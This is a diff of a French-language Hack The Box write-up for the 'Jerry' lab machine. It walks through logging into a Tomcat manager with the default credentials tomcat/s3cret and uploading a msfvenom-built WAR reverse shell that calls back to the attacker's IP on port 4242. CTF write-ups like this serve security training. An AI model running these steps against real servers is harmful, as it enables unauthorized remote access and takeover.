@@ -14,7 +14,7 @@ PORT     STATE SERVICE VERSION
 
 On remarque qu'il n'y a qu'un seul port d'ouvert, le 8080, un port HTTP pour le service Apache Tomcat, un webserver.
 
-SI on va sur la page http:// 10.10.10.95:8080, on a simplement la page de base de tomcat.
+Si on va sur la page http:// 10.10.10.95:8080, on a simplement la page de base de tomcat.
 
 
 ![j1](https://github.com/0xbatche/HTB/blob/a0e8e5661bac95047397e546ab8dcd0e59a29146/boxes/imgs/Jerry1.PNG)
@@ -24,7 +24,7 @@ En essayant d'aller sur l'onglet, Manager App, on nous demande un mot de passe.
 On essaye n'importe quoi et on se retrouve avec une erreur 401.
 
 
-Cette erreur 401 nous retourne une page, et nous dit que pour accéder à la page, on peut mettre tel user et tel mot de passe :
+Cette erreur 401 nous retourne une page, et nous dit que pour accéder à la page, on peut mettre tel tomcat et s3cret, qui sotn des mots de passe par défaut :
 
 ![j1](https://github.com/0xbatche/HTB/blob/a0e8e5661bac95047397e546ab8dcd0e59a29146/boxes/imgs/jerry2.PNG)
 
@@ -32,7 +32,7 @@ On essaye donc "tomcat" et "s3cret". Et on tombe sur la page d'administration (!
 
 ![j3](https://github.com/0xbatche/HTB/blob/a0e8e5661bac95047397e546ab8dcd0e59a29146/boxes/imgs/jerry3.PNG)
 
-On peut tenter également d'arriver différemment sur cette page, car lorsqu'on ouvre les échanges réseaux de la fenpetre dév de firefox par exemple, on voit que les crédits d'autorisation sont sous encodé en base64 :
+On peut tenter également d'arriver différemment sur cette page, car lorsqu'on ouvre les échanges réseaux de la fenêtre dév de firefox par exemple, on voit que les crédits d'autorisation sont encodés en base64 :
 
 ![j4](https://github.com/0xbatche/HTB/blob/a0e8e5661bac95047397e546ab8dcd0e59a29146/boxes/imgs/jerry4.PNG)
 
@@ -76,7 +76,7 @@ dG9tY2F0OnMzY3JldA==    [Status: 200, Size: 17035, Words: 1119, Lines: 380, Dura
 tomcat:s3cret                                                                      
 ```
 
-On voit qu'on peut upload des fichier war. Grâce au générateur de payload de metasploit, msfvenom, on peut générer un shell inversé :
+On voit qu'on peut upload des fichiers war. Grâce au générateur de payload de metasploit, msfvenom, on peut générer un shell inversé :
 
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.2 LPORT=4242 -f war -o payload.war
@@ -94,7 +94,7 @@ On upload le fichier, on clique dessus :
 ![j5](https://github.com/0xbatche/HTB/blob/a0e8e5661bac95047397e546ab8dcd0e59a29146/boxes/imgs/jerry5.PNG)
 
 
-Et on accès à la machine windows. En cherchant, on trouve un dossier des flags sur le Bureau de l'administrateur (on est déjà admin) :
+Et on accès à la machine windows via nc. En cherchant, on trouve un dossier des flags sur le Bureau de l'administrateur (on est déjà admin) :
 
 ```powershell
 C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
